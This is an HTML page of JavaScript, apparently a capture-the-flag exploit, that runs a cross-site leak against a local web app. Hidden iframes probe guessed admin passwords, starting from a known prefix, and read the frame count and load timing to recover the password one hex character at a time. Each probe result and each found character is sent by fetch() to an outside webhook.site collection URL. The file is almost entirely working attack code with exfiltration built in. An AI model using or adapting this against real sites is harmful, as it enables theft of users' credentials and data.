<!DOCTYPE html>
<html>
<head><title>Detailed Test</title></head>
<body>
<h1>Testing specific password chars...</h1>
<pre id="output"></pre>
<div id="container" style="position:absolute;left:-9999px;"></div>
<script>
const output = document.getElementById('output');
const container = document.getElementById('container');
const TARGET = 'https://127.0.0.1:9999/';

function log(msg) {
    output.textContent += msg + '\n';
    console.log(msg);
}

async function testOne(pass) {
    return new Promise((resolve) => {
        const start = Date.now();
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = TARGET + '?pass=' + encodeURIComponent(pass);
        
        const timeout = setTimeout(() => {
            const elapsed = Date.now() - start;
            if (iframe.parentNode) container.removeChild(iframe);
            resolve({ pass, result: 'timeout', elapsed, length: null });
        }, 800);
        
        iframe.onload = () => {
            setTimeout(() => {
                try {
                    const len = iframe.contentWindow.length;
                    const elapsed = Date.now() - start;
                    clearTimeout(timeout);
                    if (iframe.parentNode) container.removeChild(iframe);
                    resolve({ pass, result: 'success', elapsed, length: len });
                } catch(e) {
                    const elapsed = Date.now() - start;
                    clearTimeout(timeout);
                    if (iframe.parentNode) container.removeChild(iframe);
                    resolve({ pass, result: 'error', elapsed, length: null, error: e.message });
                }
            }, 100);
        };
        
        iframe.onerror = () => {
            const elapsed = Date.now() - start;
            clearTimeout(timeout);
            if (iframe.parentNode) container.removeChild(iframe);
            resolve({ pass, result: 'onerror', elapsed, length: null });
        };
        
        container.appendChild(iframe);
    });
}

async function runTests() {
    log('[*] Testing known prefix first...');
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test=detailed_started').catch(e=>{});
    
    // Test known good (lebah - prefix of admin password)
    let r1 = await testOne('lebah');
    log(`Test 1: "lebah" (should match, length=1)`);
    log(`  Result: ${r1.result}, Length: ${r1.length}, Time: ${r1.elapsed}ms`);
    fetch(`https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test1=${r1.result}&len=${r1.length}&time=${r1.elapsed}`).catch(e=>{});
    
    // Test first hex char - try '0'
    let r2 = await testOne('lebah0');
    log(`\nTest 2: "lebah0"`);
    log(`  Result: ${r2.result}, Length: ${r2.length}, Time: ${r2.elapsed}ms`);
    fetch(`https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test2=${r2.result}&len=${r2.length}&time=${r2.elapsed}`).catch(e=>{});
    
    // Test wrong char - should NOT match
    let r3 = await testOne('lebahZ');
    log(`\nTest 3: "lebahZ" (should NOT match, length=0)`);
    log(`  Result: ${r3.result}, Length: ${r3.length}, Time: ${r3.elapsed}ms`);
    fetch(`https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?test3=${r3.result}&len=${r3.length}&time=${r3.elapsed}`).catch(e=>{});
    
    log('\n[*] Tests complete! Check webhook for results.');
    
    // Now try ALL hex chars to find the first one
    log('\n[*] Trying all hex chars for position 1...');
    const charset = '0123456789abcdef';
    for (let c of charset) {
        let r = await testOne('lebah' + c);
        log(`  "${c}": length=${r.length}, time=${r.elapsed}ms`);
        if (r.length === 1) {
            log(`\n✓✓✓ FOUND FIRST CHAR: "${c}" ✓✓✓`);
            fetch(`https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?FOUND_CHAR=${c}`).catch(e=>{});
            break;
        }
    }
}

setTimeout(runTests, 500);
</script>
</body>
</html>
